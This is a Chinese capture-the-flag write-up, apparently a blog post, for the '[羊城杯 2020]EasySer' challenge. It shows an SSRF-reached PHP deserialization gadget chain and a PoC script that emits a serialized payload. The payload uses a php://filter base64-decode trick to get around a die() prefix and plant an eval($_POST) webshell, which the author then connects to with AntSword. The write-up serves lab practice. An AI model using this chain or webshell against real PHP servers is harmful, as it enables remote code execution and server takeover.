---
title: '[羊城杯 2020]EasySer'
date: 2024-10-22 14:16:42
tags: 反序列化
categories: 刷题笔记
---

## [羊城杯 2020]EasySer

打开网页看到个这玩意，还以为网页又崩了

![image-20241022153550094](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410221535204.png)

我们打开robots.txt，找到了个新文件

![image-20241022153637493](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410221536547.png)

我们访问看看

<!--more-->

![image-20241022153656899](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410221536940.png)

看上去挺像ssrf的，我们打开页面源码，发现了个提示

![image-20241022153742610](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410221537645.png)

我们本地访问ser.php，得到源码

```
<?php
error_reporting(0);
if ( $_SERVER['REMOTE_ADDR'] == "127.0.0.1" ) {
    highlight_file(__FILE__);
} 
$flag='{Trump_:"fake_news!"}';

class GWHT{
    public $hero;
    public function __construct(){
        $this->hero = new Yasuo;
    }
    public function __toString(){
        if (isset($this->hero)){
            return $this->hero->hasaki();
        }else{
            return "You don't look very happy";
        }
    }
}
class Yongen{ //flag.php
    public $file;
    public $text;
    public function __construct($file='',$text='') {
        $this -> file = $file;
        $this -> text = $text;
        
    }
    public function hasaki(){
        $d   = '<?php die("nononon");?>';
        $a= $d. $this->text;
         @file_put_contents($this-> file,$a);
    }
}
class Yasuo{
    public function hasaki(){
        return "I'm the best happy windy man";
    }
}

?>
```

我们发现这个页面输出了your hat is too black!，但ser源码里又没有这串字符串

我们猜测字符串和反序列化的unserialize在star1里

我们使用arjun工具爆破页面参数

```
arjun -u http://487dd981-b586-46dc-9fc2-d3921bdd7d18.node5.buuoj.cn:81/star1.php?path=http://127.0.0.1/ser.php -m GET
```

得到两个参数path和c，path已经有了，那c就是反序列化的传参点



我们来看源码，发现文件包含函数file_put_contents

```
class Yongen{ //flag.php
    public $file;
    public $text;
    public function __construct($file='',$text='') {
        $this -> file = $file;
        $this -> text = $text;
        
    }
    public function hasaki(){
        $d   = '<?php die("nononon");?>';
        $a= $d. $this->text;
         @file_put_contents($this-> file,$a);
    }
}

```

我们可以将一句话木马写入文件中，再连接蚁剑得到flag，但问题是<?php die("nononon");?>'会强制终止代码

我们参考绕过死亡die的方法，用php过滤器来对文件内容进行base64解码，它的字符范围包括`a-z A-Z 0-9 = /`，计算`<?php die("nononon");?>`包含在内的字符，以4bytes一位编码来计算需要补多少位。点到`phpdienononon`一共是13位，我们还需要补三位，那我们直接在base64编码后的一句话木马内容前面加三个a即可

然后就是怎么触发`__tostring`方法了，看了wp才知道，那个页面的反序列化点会直接输出对象，能够直接触发该方法

poc

```
<?php
class GWHT{
    public $hero;
    public function __construct(){
        $this->hero = new Yongen;
    }
}
class Yongen{
    public $file;
    public $text;
        public function __construct(){
        $this->file = "php://filter/convert.base64-decode/resource=shell.php";
        $this->text="aaaPD9waHAgQGV2YWwoJF9QT1NUWzBdKTs/Pg==";
    }
}

echo serialize(new GWHT);
?>
    ----------------------------------------------
payload:
/star1.php?path=http://127.0.0.1/ser.php&c=O:4:"GWHT":1:{s:4:"hero";O:6:"Yongen":2:{s:4:"file";s:53:"php://filter/convert.base64-decode/resource=shell.php";s:4:"text";s:39:"aaaPD9waHAgQGV2YWwoJF9QT1NUWzBdKTs/Pg==";}}

```

![image-20241022155450810](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410221554840.png)

连接蚁剑，得到flag

![image-20241022155702877](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410221557919.png)
